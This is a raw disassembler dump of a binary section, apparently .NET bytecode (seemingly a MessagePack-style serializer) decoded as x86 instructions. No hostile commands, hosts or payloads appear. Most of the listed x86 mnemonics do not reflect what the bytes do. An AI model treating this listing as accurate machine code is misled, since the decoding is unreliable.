  4046e7:	58                   	pop    %eax
  4046e8:	0a 08                	or     (%eax),%cl
  4046ea:	11 04 7b             	adc    %eax,(%ebx,%edi,2)
  4046ed:	34 00                	xor    $0x0,%al
  4046ef:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4046f2:	ed                   	in     (%dx),%eax
  4046f3:	00 00                	add    %al,(%eax)
  4046f5:	0a 39                	or     (%ecx),%bh
  4046f7:	07                   	pop    %es
  4046f8:	00 00                	add    %al,(%eax)
  4046fa:	00 06                	add    %al,(%esi)
  4046fc:	0b dd                	or     %ebp,%ebx
  4046fe:	1c 00                	sbb    $0x0,%al
  404700:	00 00                	add    %al,(%eax)
  404702:	12 03                	adc    (%ebx),%al
  404704:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  40470a:	d1 dd                	rcr    $1,%ebp
  40470c:	0e                   	push   %cs
  40470d:	00 00                	add    %al,(%eax)
  40470f:	00 12                	add    %dl,(%edx)
  404711:	03 fe                	add    %esi,%edi
  404713:	16                   	push   %ss
  404714:	04 00                	add    $0x0,%al
  404716:	00 1b                	add    %bl,(%ebx)
  404718:	6f                   	outsl  %ds:(%esi),(%dx)
  404719:	33 00                	xor    (%eax),%eax
  40471b:	00 0a                	add    %cl,(%edx)
  40471d:	dc 07                	faddl  (%edi)
  40471f:	2a 01                	sub    (%ecx),%al
  404721:	10 00                	adc    %al,(%eax)
  404723:	00 02                	add    %al,(%edx)
  404725:	00 17                	add    %dl,(%edi)
  404727:	00 39                	add    %bh,(%ecx)
  404729:	50                   	push   %eax
  40472a:	00 0e                	add    %cl,(%esi)
  40472c:	00 00                	add    %al,(%eax)
  40472e:	00 00                	add    %al,(%eax)
  404730:	13 30                	adc    (%eax),%esi
  404732:	02 00                	add    (%eax),%al
  404734:	1e                   	push   %ds
  404735:	00 00                	add    %al,(%eax)
  404737:	00 01                	add    %al,(%ecx)
  404739:	00 00                	add    %al,(%eax)
  40473b:	11 02                	adc    %eax,(%edx)
  40473d:	03 28                	add    (%eax),%ebp
  40473f:	6d                   	insl   (%dx),%es:(%edi)
  404740:	00 00                	add    %al,(%eax)
  404742:	06                   	push   %es
  404743:	0a 06                	or     (%esi),%al
  404745:	15 40 02 00 00       	adc    $0x240,%eax
  40474a:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  40474d:	02 7b 38             	add    0x38(%ebx),%bh
  404750:	00 00                	add    %al,(%eax)
  404752:	04 06                	add    $0x6,%al
  404754:	6f                   	outsl  %ds:(%esi),(%dx)
  404755:	ea 00 00 0a 2a 00 00 	ljmp   $0x0,$0x2a0a0000
  40475c:	13 30                	adc    (%eax),%esi
  40475e:	04 00                	add    $0x0,%al
  404760:	bc 00 00 00 1f       	mov    $0x1f000000,%esp
  404765:	00 00                	add    %al,(%eax)
  404767:	11 02                	adc    %eax,(%edx)
  404769:	7b 38                	jnp    0x4047a3
  40476b:	00 00                	add    %al,(%eax)
  40476d:	04 6f                	add    $0x6f,%al
  40476f:	eb 00                	jmp    0x404771
  404771:	00 0a                	add    %cl,(%edx)
  404773:	0a 06                	or     (%esi),%al
  404775:	1f                   	pop    %ds
  404776:	0f 3d                	(bad)
  404778:	16                   	push   %ss
  404779:	00 00                	add    %al,(%eax)
  40477b:	00 20                	add    %ah,(%eax)
  40477d:	80 00 00             	addb   $0x0,(%eax)
  404780:	00 06                	add    %al,(%esi)
  404782:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  404785:	0b 03                	or     (%ebx),%eax
  404787:	07                   	pop    %es
  404788:	6f                   	outsl  %ds:(%esi),(%dx)
  404789:	ee                   	out    %al,(%dx)
  40478a:	00 00                	add    %al,(%eax)
  40478c:	0a 38                	or     (%eax),%bh
  40478e:	59                   	pop    %ecx
  40478f:	00 00                	add    %al,(%eax)
  404791:	00 06                	add    %al,(%esi)
  404793:	20 ff                	and    %bh,%bh
  404795:	ff 00                	incl   (%eax)
  404797:	00 3d 2a 00 00 00    	add    %bh,0x2a
  40479d:	20 de                	and    %bl,%dh
  40479f:	00 00                	add    %al,(%eax)
  4047a1:	00 0b                	add    %cl,(%ebx)
  4047a3:	03 07                	add    (%edi),%eax
  4047a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4047a6:	ee                   	out    %al,(%dx)
  4047a7:	00 00                	add    %al,(%eax)
  4047a9:	0a 06                	or     (%esi),%al
  4047ab:	68 28 ef 00 00       	push   $0xef28
  4047b0:	0a 28                	or     (%eax),%ch
  4047b2:	58                   	pop    %eax
  4047b3:	00 00                	add    %al,(%eax)
  4047b5:	06                   	push   %es
  4047b6:	0c 03                	or     $0x3,%al
  4047b8:	08 16                	or     %dl,(%esi)
  4047ba:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047c0:	00 0a                	add    %cl,(%edx)
  4047c2:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  4047c5:	00 00                	add    %al,(%eax)
  4047c7:	20 df                	and    %bl,%bh
  4047c9:	00 00                	add    %al,(%eax)
  4047cb:	00 0b                	add    %cl,(%ebx)
  4047cd:	03 07                	add    (%edi),%eax
  4047cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4047d0:	ee                   	out    %al,(%dx)
  4047d1:	00 00                	add    %al,(%eax)
  4047d3:	0a 06                	or     (%esi),%al
  4047d5:	28 4a 00             	sub    %cl,0x0(%edx)
  4047d8:	00 0a                	add    %cl,(%edx)
  4047da:	28 58 00             	sub    %bl,0x0(%eax)
  4047dd:	00 06                	add    %al,(%esi)
  4047df:	0c 03                	or     $0x3,%al
  4047e1:	08 16                	or     %dl,(%esi)
  4047e3:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047e9:	00 0a                	add    %cl,(%edx)
  4047eb:	16                   	push   %ss
  4047ec:	0d 38 2d 00 00       	or     $0x2d38,%eax
  4047f1:	00 03                	add    %al,(%ebx)
  4047f3:	02 7b 38             	add    0x38(%ebx),%bh
  4047f6:	00 00                	add    %al,(%eax)
  4047f8:	04 09                	add    $0x9,%al
  4047fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4047fb:	ea 00 00 0a 7b 33 00 	ljmp   $0x33,$0x7b0a0000
  404802:	00 04 28             	add    %al,(%eax,%ebp,1)
  404805:	9a 00 00 06 02 7b 38 	lcall  $0x387b,$0x2060000
  40480c:	00 00                	add    %al,(%eax)
  40480e:	04 09                	add    $0x9,%al
  404810:	6f                   	outsl  %ds:(%esi),(%dx)
  404811:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  404818:	00 00                	add    %al,(%eax)
  40481a:	06                   	push   %es
  40481b:	09 17                	or     %edx,(%edi)
  40481d:	58                   	pop    %eax
  40481e:	0d 09 06 32 cf       	or     $0xcf320609,%eax
  404823:	2a 13                	sub    (%ebx),%dl
  404825:	30 04 00             	xor    %al,(%eax,%eax,1)
  404828:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404829:	00 00                	add    %al,(%eax)
  40482b:	00 1f                	add    %bl,(%edi)
  40482d:	00 00                	add    %al,(%eax)
  40482f:	11 02                	adc    %eax,(%edx)
  404831:	7b 38                	jnp    0x40486b
  404833:	00 00                	add    %al,(%eax)
  404835:	04 6f                	add    $0x6f,%al
  404837:	eb 00                	jmp    0x404839
  404839:	00 0a                	add    %cl,(%edx)
  40483b:	0a 06                	or     (%esi),%al
  40483d:	1f                   	pop    %ds
  40483e:	0f 3d                	(bad)
  404840:	16                   	push   %ss
  404841:	00 00                	add    %al,(%eax)
  404843:	00 20                	add    %ah,(%eax)
  404845:	90                   	nop
  404846:	00 00                	add    %al,(%eax)
  404848:	00 06                	add    %al,(%esi)
  40484a:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  40484d:	0b 03                	or     (%ebx),%eax
  40484f:	07                   	pop    %es
  404850:	6f                   	outsl  %ds:(%esi),(%dx)
  404851:	ee                   	out    %al,(%dx)
  404852:	00 00                	add    %al,(%eax)
  404854:	0a 38                	or     (%eax),%bh
  404856:	59                   	pop    %ecx
  404857:	00 00                	add    %al,(%eax)
  404859:	00 06                	add    %al,(%esi)
  40485b:	20 ff                	and    %bh,%bh
  40485d:	ff 00                	incl   (%eax)
  40485f:	00 3d 2a 00 00 00    	add    %bh,0x2a
  404865:	20 dc                	and    %bl,%ah
  404867:	00 00                	add    %al,(%eax)
  404869:	00 0b                	add    %cl,(%ebx)
  40486b:	03 07                	add    (%edi),%eax
  40486d:	6f                   	outsl  %ds:(%esi),(%dx)
  40486e:	ee                   	out    %al,(%dx)
  40486f:	00 00                	add    %al,(%eax)
  404871:	0a 06                	or     (%esi),%al
  404873:	68 28 ef 00 00       	push   $0xef28
  404878:	0a 28                	or     (%eax),%ch
  40487a:	58                   	pop    %eax
  40487b:	00 00                	add    %al,(%eax)
  40487d:	06                   	push   %es
  40487e:	0c 03                	or     $0x3,%al
  404880:	08 16                	or     %dl,(%esi)
  404882:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  404888:	00 0a                	add    %cl,(%edx)
  40488a:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  40488d:	00 00                	add    %al,(%eax)
  40488f:	20 dd                	and    %bl,%ch
  404891:	00 00                	add    %al,(%eax)
  404893:	00 0b                	add    %cl,(%ebx)
  404895:	03 07                	add    (%edi),%eax
  404897:	6f                   	outsl  %ds:(%esi),(%dx)
  404898:	ee                   	out    %al,(%dx)
  404899:	00 00                	add    %al,(%eax)
  40489b:	0a 06                	or     (%esi),%al
  40489d:	28 4a 00             	sub    %cl,0x0(%edx)
  4048a0:	00 0a                	add    %cl,(%edx)
  4048a2:	28 58 00             	sub    %bl,0x0(%eax)
  4048a5:	00 06                	add    %al,(%esi)
  4048a7:	0c 03                	or     $0x3,%al
  4048a9:	08 16                	or     %dl,(%esi)
  4048ab:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4048b1:	00 0a                	add    %cl,(%edx)
  4048b3:	16                   	push   %ss
  4048b4:	0d 38 16 00 00       	or     $0x1638,%eax
  4048b9:	00 02                	add    %al,(%edx)
  4048bb:	7b 38                	jnp    0x4048f5
  4048bd:	00 00                	add    %al,(%eax)
  4048bf:	04 09                	add    $0x9,%al
  4048c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4048c2:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  4048c9:	00 00                	add    %al,(%eax)
  4048cb:	06                   	push   %es
  4048cc:	09 17                	or     %edx,(%edi)
  4048ce:	58                   	pop    %eax
  4048cf:	0d 09 06 32 e6       	or     $0xe6320609,%eax
  4048d4:	2a 00                	sub    (%eax),%al
  4048d6:	00 00                	add    %al,(%eax)
  4048d8:	13 30                	adc    (%eax),%esi
  4048da:	02 00                	add    (%eax),%al
  4048dc:	99                   	cltd
  4048dd:	00 00                	add    %al,(%eax)
  4048df:	00 20                	add    %ah,(%eax)
  4048e1:	00 00                	add    %al,(%eax)
  4048e3:	11 02                	adc    %eax,(%edx)
  4048e5:	7b 36                	jnp    0x40491d
  4048e7:	00 00                	add    %al,(%eax)
  4048e9:	04 0a                	add    $0xa,%al
  4048eb:	06                   	push   %es
  4048ec:	1a 59 45             	sbb    0x45(%ecx),%bl
  4048ef:	07                   	pop    %es
  4048f0:	00 00                	add    %al,(%eax)
  4048f2:	00 22                	add    %ah,(%edx)
  4048f4:	00 00                	add    %al,(%eax)
  4048f6:	00 05 00 00 00 16    	add    %al,0x16000000
  4048fc:	00 00                	add    %al,(%eax)
  4048fe:	00 6b 00             	add    %ch,0x0(%ebx)
  404901:	00 00                	add    %al,(%eax)
  404903:	38 00                	cmp    %al,(%eax)
  404905:	00 00                	add    %al,(%eax)
  404907:	49                   	dec    %ecx
  404908:	00 00                	add    %al,(%eax)
  40490a:	00 5a 00             	add    %bl,0x0(%edx)
  40490d:	00 00                	add    %al,(%eax)
  40490f:	38 66 00             	cmp    %ah,0x0(%esi)
  404912:	00 00                	add    %al,(%eax)
  404914:	02 7b 35             	add    0x35(%ebx),%bh
  404917:	00 00                	add    %al,(%eax)
  404919:	04 a5                	add    $0xa5,%al
  40491b:	68 00 00 01 28       	push   $0x28010000
  404920:	f0 00 00             	lock add %al,(%eax)
  404923:	0a 2a                	or     (%edx),%ch
  404925:	02 7b 35             	add    0x35(%ebx),%bh
  404928:	00 00                	add    %al,(%eax)
  40492a:	04 a5                	add    $0xa5,%al
  40492c:	95                   	xchg   %eax,%ebp
  40492d:	00 00                	add    %al,(%eax)
  40492f:	01 2a                	add    %ebp,(%edx)
  404931:	02 7b 35             	add    0x35(%ebx),%bh
  404934:	00 00                	add    %al,(%eax)
  404936:	04 6f                	add    $0x6f,%al
  404938:	38 00                	cmp    %al,(%eax)
  40493a:	00 0a                	add    %cl,(%edx)
  40493c:	6f                   	outsl  %ds:(%esi),(%dx)
  40493d:	f1                   	int1
  40493e:	00 00                	add    %al,(%eax)
  404940:	0a 28                	or     (%eax),%ch
  404942:	f2 00 00             	repnz add %al,(%eax)
  404945:	0a 2a                	or     (%edx),%ch
  404947:	02 7b 35             	add    0x35(%ebx),%bh
  40494a:	00 00                	add    %al,(%eax)
  40494c:	04 a5                	add    $0xa5,%al
  40494e:	96                   	xchg   %eax,%esi
  40494f:	00 00                	add    %al,(%eax)
  404951:	01 28                	add    %ebp,(%eax)
  404953:	f3 00 00             	repz add %al,(%eax)
  404956:	0a 2a                	or     (%edx),%ch
  404958:	02 7b 35             	add    0x35(%ebx),%bh
  40495b:	00 00                	add    %al,(%eax)
  40495d:	04 a5                	add    $0xa5,%al
  40495f:	97                   	xchg   %eax,%edi
  404960:	00 00                	add    %al,(%eax)
  404962:	01 28                	add    %ebp,(%eax)
  404964:	f4                   	hlt
  404965:	00 00                	add    %al,(%eax)
  404967:	0a 2a                	or     (%edx),%ch
  404969:	02 7b 35             	add    0x35(%ebx),%bh
  40496c:	00 00                	add    %al,(%eax)
  40496e:	04 a5                	add    $0xa5,%al
  404970:	6b 00 00             	imul   $0x0,(%eax),%eax
  404973:	01 28                	add    %ebp,(%eax)
  404975:	f5                   	cmc
  404976:	00 00                	add    %al,(%eax)
  404978:	0a 2a                	or     (%edx),%ch
  40497a:	16                   	push   %ss
  40497b:	6a 2a                	push   $0x2a
  40497d:	00 00                	add    %al,(%eax)
  40497f:	00 13                	add    %dl,(%ebx)
  404981:	30 02                	xor    %al,(%edx)
  404983:	00 99 00 00 00 20    	add    %bl,0x20000000(%ecx)
  404989:	00 00                	add    %al,(%eax)
  40498b:	11 02                	adc    %eax,(%edx)
  40498d:	7b 36                	jnp    0x4049c5
  40498f:	00 00                	add    %al,(%eax)
  404991:	04 0a                	add    $0xa,%al
  404993:	06                   	push   %es
  404994:	1a 59 45             	sbb    0x45(%ecx),%bl
  404997:	07                   	pop    %es
  404998:	00 00                	add    %al,(%eax)
  40499a:	00 22                	add    %ah,(%edx)
  40499c:	00 00                	add    %al,(%eax)
  40499e:	00 05 00 00 00 11    	add    %al,0x11000000
  4049a4:	00 00                	add    %al,(%eax)
  4049a6:	00 6b 00             	add    %ch,0x0(%ebx)
  4049a9:	00 00                	add    %al,(%eax)
  4049ab:	38 00                	cmp    %al,(%eax)
  4049ad:	00 00                	add    %al,(%eax)
  4049af:	49                   	dec    %ecx
  4049b0:	00 00                	add    %al,(%eax)
  4049b2:	00 5a 00             	add    %bl,0x0(%edx)
  4049b5:	00 00                	add    %al,(%eax)
  4049b7:	38 66 00             	cmp    %ah,0x0(%esi)
  4049ba:	00 00                	add    %al,(%eax)
  4049bc:	02 7b 35             	add    0x35(%ebx),%bh
  4049bf:	00 00                	add    %al,(%eax)
  4049c1:	04 a5                	add    $0xa5,%al
  4049c3:	68 00 00 01 2a       	push   $0x2a010000
  4049c8:	02 7b 35             	add    0x35(%ebx),%bh
  4049cb:	00 00                	add    %al,(%eax)
  4049cd:	04 a5                	add    $0xa5,%al
  4049cf:	68 00 00 01 28       	push   $0x28010000
  4049d4:	f6 00 00             	testb  $0x0,(%eax)
  4049d7:	0a 2a                	or     (%edx),%ch
  4049d9:	02 7b 35             	add    0x35(%ebx),%bh
  4049dc:	00 00                	add    %al,(%eax)
  4049de:	04 6f                	add    $0x6f,%al
  4049e0:	38 00                	cmp    %al,(%eax)
  4049e2:	00 0a                	add    %cl,(%edx)
  4049e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4049e5:	f1                   	int1
  4049e6:	00 00                	add    %al,(%eax)
  4049e8:	0a 28                	or     (%eax),%ch
  4049ea:	f7 00 00 0a 2a 02    	testl  $0x22a0a00,(%eax)
  4049f0:	7b 35                	jnp    0x404a27
  4049f2:	00 00                	add    %al,(%eax)
  4049f4:	04 a5                	add    $0xa5,%al
  4049f6:	96                   	xchg   %eax,%esi
  4049f7:	00 00                	add    %al,(%eax)
  4049f9:	01 28                	add    %ebp,(%eax)
  4049fb:	f8                   	clc
  4049fc:	00 00                	add    %al,(%eax)
  4049fe:	0a 2a                	or     (%edx),%ch
  404a00:	02 7b 35             	add    0x35(%ebx),%bh
  404a03:	00 00                	add    %al,(%eax)
  404a05:	04 a5                	add    $0xa5,%al
  404a07:	97                   	xchg   %eax,%edi
  404a08:	00 00                	add    %al,(%eax)
  404a0a:	01 28                	add    %ebp,(%eax)
  404a0c:	f9                   	stc
  404a0d:	00 00                	add    %al,(%eax)
  404a0f:	0a 2a                	or     (%edx),%ch
  404a11:	02 7b 35             	add    0x35(%ebx),%bh
  404a14:	00 00                	add    %al,(%eax)
  404a16:	04 a5                	add    $0xa5,%al
  404a18:	6b 00 00             	imul   $0x0,(%eax),%eax
  404a1b:	01 28                	add    %ebp,(%eax)
  404a1d:	fa                   	cli
  404a1e:	00 00                	add    %al,(%eax)
  404a20:	0a 2a                	or     (%edx),%ch
  404a22:	16                   	push   %ss
  404a23:	6a 2a                	push   $0x2a
  404a25:	00 00                	add    %al,(%eax)
  404a27:	00 13                	add    %dl,(%ebx)
  404a29:	30 02                	xor    %al,(%edx)
  404a2b:	00 87 00 00 00 20    	add    %al,0x20000000(%edi)
  404a31:	00 00                	add    %al,(%eax)
  404a33:	11 02                	adc    %eax,(%edx)
  404a35:	7b 36                	jnp    0x404a6d
  404a37:	00 00                	add    %al,(%eax)
  404a39:	04 0a                	add    $0xa,%al
  404a3b:	06                   	push   %es
  404a3c:	1a 59 45             	sbb    0x45(%ecx),%bl
  404a3f:	07                   	pop    %es
  404a40:	00 00                	add    %al,(%eax)
  404a42:	00 16                	add    %dl,(%esi)
  404a44:	00 00                	add    %al,(%eax)
  404a46:	00 05 00 00 00 52    	add    %al,0x52000000
  404a4c:	00 00                	add    %al,(%eax)
  404a4e:	00 52 00             	add    %dl,0x0(%edx)
  404a51:	00 00                	add    %al,(%eax)
  404a53:	27                   	daa
  404a54:	00 00                	add    %al,(%eax)
  404a56:	00 33                	add    %dh,(%ebx)
  404a58:	00 00                	add    %al,(%eax)
  404a5a:	00 40 00             	add    %al,0x0(%eax)
  404a5d:	00 00                	add    %al,(%eax)
  404a5f:	38 4d 00             	cmp    %cl,0x0(%ebp)
  404a62:	00 00                	add    %al,(%eax)
  404a64:	02 7b 35             	add    0x35(%ebx),%bh
  404a67:	00 00                	add    %al,(%eax)
  404a69:	04 a5                	add    $0xa5,%al
  404a6b:	68 00 00 01 28       	push   $0x28010000
  404a70:	fb                   	sti
  404a71:	00 00                	add    %al,(%eax)
  404a73:	0a 2a                	or     (%edx),%ch
  404a75:	02 7b 35             	add    0x35(%ebx),%bh
  404a78:	00 00                	add    %al,(%eax)
  404a7a:	04 74                	add    $0x74,%al
  404a7c:	38 00                	cmp    %al,(%eax)
  404a7e:	00 01                	add    %al,(%ecx)
  404a80:	28 fc                	sub    %bh,%ah
  404a82:	00 00                	add    %al,(%eax)
  404a84:	0a 2a                	or     (%edx),%ch
  404a86:	02 7b 35             	add    0x35(%ebx),%bh
  404a89:	00 00                	add    %al,(%eax)
  404a8b:	04 a5                	add    $0xa5,%al
  404a8d:	96                   	xchg   %eax,%esi
  404a8e:	00 00                	add    %al,(%eax)
  404a90:	01 2a                	add    %ebp,(%edx)
  404a92:	02 7b 35             	add    0x35(%ebx),%bh
  404a95:	00 00                	add    %al,(%eax)
  404a97:	04 a5                	add    $0xa5,%al
  404a99:	97                   	xchg   %eax,%edi
  404a9a:	00 00                	add    %al,(%eax)
  404a9c:	01 6c 2a 02          	add    %ebp,0x2(%edx,%ebp,1)
  404aa0:	7b 35                	jnp    0x404ad7
  404aa2:	00 00                	add    %al,(%eax)
  404aa4:	04 a5                	add    $0xa5,%al
  404aa6:	6b 00 00             	imul   $0x0,(%eax),%eax
  404aa9:	01 28                	add    %ebp,(%eax)
  404aab:	fa                   	cli
  404aac:	00 00                	add    %al,(%eax)
  404aae:	0a 6c 2a 23          	or     0x23(%edx,%ebp,1),%ch
	...
  404aba:	2a 00                	sub    (%eax),%al
  404abc:	13 30                	adc    (%eax),%esi
  404abe:	02 00                	add    (%eax),%al
  404ac0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404ac1:	00 00                	add    %al,(%eax)
  404ac3:	00 21                	add    %ah,(%ecx)
  404ac5:	00 00                	add    %al,(%eax)
  404ac7:	11 02                	adc    %eax,(%edx)
  404ac9:	7b 36                	jnp    0x404b01
  404acb:	00 00                	add    %al,(%eax)
  404acd:	04 0a                	add    $0xa,%al
  404acf:	06                   	push   %es
  404ad0:	1a 59 45             	sbb    0x45(%ecx),%bl
  404ad3:	08 00                	or     %al,(%eax)
  404ad5:	00 00                	add    %al,(%eax)
  404ad7:	16                   	push   %ss
  404ad8:	00 00                	add    %al,(%eax)
  404ada:	00 05 00 00 00 6e    	add    %al,0x6e000000
  404ae0:	00 00                	add    %al,(%eax)
  404ae2:	00 6e 00             	add    %ch,0x0(%esi)
  404ae5:	00 00                	add    %al,(%eax)
  404ae7:	27                   	daa
  404ae8:	00 00                	add    %al,(%eax)
  404aea:	00 38                	add    %bh,(%eax)
  404aec:	00 00                	add    %al,(%eax)
  404aee:	00 49 00             	add    %cl,0x0(%ecx)
  404af1:	00 00                	add    %al,(%eax)
  404af3:	62 00                	bound  %eax,(%eax)
  404af5:	00 00                	add    %al,(%eax)
  404af7:	38 69 00             	cmp    %ch,0x0(%ecx)
  404afa:	00 00                	add    %al,(%eax)
  404afc:	02 7b 35             	add    0x35(%ebx),%bh
  404aff:	00 00                	add    %al,(%eax)
  404b01:	04 a5                	add    $0xa5,%al
  404b03:	68 00 00 01 28       	push   $0x28010000
  404b08:	e7 00                	out    %eax,$0x0
  404b0a:	00 0a                	add    %cl,(%edx)
  404b0c:	2a 02                	sub    (%edx),%al
  404b0e:	7b 35                	jnp    0x404b45
  404b10:	00 00                	add    %al,(%eax)
  404b12:	04 6f                	add    $0x6f,%al
  404b14:	38 00                	cmp    %al,(%eax)
  404b16:	00 0a                	add    %cl,(%edx)
  404b18:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  404b1c:	06                   	push   %es
  404b1d:	2a 02                	sub    (%edx),%al
  404b1f:	7b 35                	jnp    0x404b56
  404b21:	00 00                	add    %al,(%eax)
  404b23:	04 a5                	add    $0xa5,%al
  404b25:	96                   	xchg   %eax,%esi
  404b26:	00 00                	add    %al,(%eax)
  404b28:	01 28                	add    %ebp,(%eax)
  404b2a:	e8 00 00 0a 2a       	call   0x2a4a4b2f
  404b2f:	02 7b 35             	add    0x35(%ebx),%bh
  404b32:	00 00                	add    %al,(%eax)
  404b34:	04 a5                	add    $0xa5,%al
  404b36:	97                   	xchg   %eax,%edi
  404b37:	00 00                	add    %al,(%eax)
  404b39:	01 28                	add    %ebp,(%eax)
  404b3b:	fd                   	std
  404b3c:	00 00                	add    %al,(%eax)
  404b3e:	0a 2a                	or     (%edx),%ch
  404b40:	02 7b 35             	add    0x35(%ebx),%bh
  404b43:	00 00                	add    %al,(%eax)
  404b45:	04 a5                	add    $0xa5,%al
  404b47:	6b 00 00             	imul   $0x0,(%eax),%eax
  404b4a:	01 0b                	add    %ecx,(%ebx)
  404b4c:	12 01                	adc    (%ecx),%al
  404b4e:	28 fe                	sub    %bh,%dh
  404b50:	00 00                	add    %al,(%eax)
  404b52:	0a 28                	or     (%eax),%ch
  404b54:	e7 00                	out    %eax,$0x0
  404b56:	00 0a                	add    %cl,(%edx)
  404b58:	2a 02                	sub    (%edx),%al
  404b5a:	7b 35                	jnp    0x404b91
  404b5c:	00 00                	add    %al,(%eax)
  404b5e:	04 74                	add    $0x74,%al
  404b60:	02 00                	add    (%eax),%al
  404b62:	00 1b                	add    %bl,(%ebx)
  404b64:	2a 16                	sub    (%esi),%dl
  404b66:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404b6a:	01 2a                	add    %ebp,(%edx)
  404b6c:	13 30                	adc    (%eax),%esi
  404b6e:	04 00                	add    $0x0,%al
  404b70:	4b                   	dec    %ebx
  404b71:	00 00                	add    %al,(%eax)
  404b73:	00 22                	add    %ah,(%edx)
  404b75:	00 00                	add    %al,(%eax)
  404b77:	11 03                	adc    %eax,(%ebx)
  404b79:	28 6a 00             	sub    %ch,0x0(%edx)
  404b7c:	00 0a                	add    %cl,(%edx)
  404b7e:	39 3e                	cmp    %edi,(%esi)
  404b80:	00 00                	add    %al,(%eax)
  404b82:	00 14 0a             	add    %dl,(%edx,%ecx,1)
  404b85:	03 19                	add    (%ecx),%ebx
  404b87:	17                   	pop    %ss
  404b88:	17                   	pop    %ss
  404b89:	73 ff                	jae    0x404b8a
  404b8b:	00 00                	add    %al,(%eax)
  404b8d:	0a 0b                	or     (%ebx),%cl
  404b8f:	07                   	pop    %es
  404b90:	6f                   	outsl  %ds:(%esi),(%dx)
  404b91:	e2 00                	loop   0x404b93
  404b93:	00 0a                	add    %cl,(%edx)
  404b95:	d4 8d                	aam    $0x8d
  404b97:	44                   	inc    %esp
  404b98:	00 00                	add    %al,(%eax)
  404b9a:	01 0a                	add    %ecx,(%edx)
  404b9c:	07                   	pop    %es
  404b9d:	06                   	push   %es
  404b9e:	16                   	push   %ss
  404b9f:	07                   	pop    %es
  404ba0:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba1:	e2 00                	loop   0x404ba3
  404ba3:	00 0a                	add    %cl,(%edx)
  404ba5:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  404bac:	07                   	pop    %es
  404bad:	6f                   	outsl  %ds:(%esi),(%dx)
  404bae:	9f                   	lahf
  404baf:	00 00                	add    %al,(%eax)
  404bb1:	0a 07                	or     (%edi),%al
  404bb3:	6f                   	outsl  %ds:(%esi),(%dx)
  404bb4:	40                   	inc    %eax
  404bb5:	00 00                	add    %al,(%eax)
  404bb7:	0a 02                	or     (%edx),%al
  404bb9:	06                   	push   %es
  404bba:	28 79 00             	sub    %bh,0x0(%ecx)
  404bbd:	00 06                	add    %al,(%esi)
  404bbf:	17                   	pop    %ss
  404bc0:	2a 16                	sub    (%esi),%dl
  404bc2:	2a 00                	sub    (%eax),%al
  404bc4:	13 30                	adc    (%eax),%esi
  404bc6:	05 00 40 00 00       	add    $0x4000,%eax
  404bcb:	00 00                	add    %al,(%eax)
  404bcd:	00 00                	add    %al,(%eax)
  404bcf:	00 02                	add    %al,(%edx)
  404bd1:	7b 35                	jnp    0x404c08
  404bd3:	00 00                	add    %al,(%eax)
  404bd5:	04 39                	add    $0x39,%al
  404bd7:	33 00                	xor    (%eax),%eax
  404bd9:	00 00                	add    %al,(%eax)
  404bdb:	03 1c 73             	add    (%ebx,%esi,2),%ebx
  404bde:	6c                   	insb   (%dx),%es:(%edi)
  404bdf:	00 00                	add    %al,(%eax)
  404be1:	0a 25 02 7b 35 00    	or     0x357b02,%ah
  404be7:	00 04 74             	add    %al,(%esp,%esi,2)
  404bea:	02 00                	add    (%eax),%al
  404bec:	00 1b                	add    %bl,(%ebx)
  404bee:	16                   	push   %ss
  404bef:	02 7b 35             	add    0x35(%ebx),%bh
  404bf2:	00 00                	add    %al,(%eax)
  404bf4:	04 74                	add    $0x74,%al
  404bf6:	02 00                	add    (%eax),%al
  404bf8:	00 1b                	add    %bl,(%ebx)
  404bfa:	8e 69 6f             	mov    0x6f(%ecx),%gs
  404bfd:	4c                   	dec    %esp
  404bfe:	00 00                	add    %al,(%eax)
  404c00:	0a 25 6f 9f 00 00    	or     0x9f6f,%ah
  404c06:	0a 6f 40             	or     0x40(%edi),%ch
  404c09:	00 00                	add    %al,(%eax)
  404c0b:	0a 17                	or     (%edi),%dl
  404c0d:	2a 16                	sub    (%esi),%dl
  404c0f:	2a 13                	sub    (%ebx),%dl
  404c11:	30 04 00             	xor    %al,(%eax,%eax,1)
  404c14:	af                   	scas   %es:(%edi),%eax
  404c15:	00 00                	add    %al,(%eax)
  404c17:	00 23                	add    %ah,(%ebx)
  404c19:	00 00                	add    %al,(%eax)
  404c1b:	11 02                	adc    %eax,(%edx)
  404c1d:	0a 03                	or     (%ebx),%al
  404c1f:	6f                   	outsl  %ds:(%esi),(%dx)
  404c20:	f1                   	int1
  404c21:	00 00                	add    %al,(%eax)
  404c23:	0a 19                	or     (%ecx),%bl
  404c25:	8d 39                	lea    (%ecx),%edi
  404c27:	00 00                	add    %al,(%eax)
  404c29:	01 25 d0 47 00 00    	add    %esp,0x47d0
  404c2f:	04 28                	add    $0x28,%al
  404c31:	e4 00                	in     $0x0,%al
  404c33:	00 0a                	add    %cl,(%edx)
  404c35:	6f                   	outsl  %ds:(%esi),(%dx)
  404c36:	26 00 00             	add    %al,%es:(%eax)
  404c39:	0a 0b                	or     (%ebx),%cl
  404c3b:	14 0c                	adc    $0xc,%al
  404c3d:	07                   	pop    %es
  404c3e:	8e 3a                	mov    (%edx),%?
  404c40:	02 00                	add    (%eax),%al
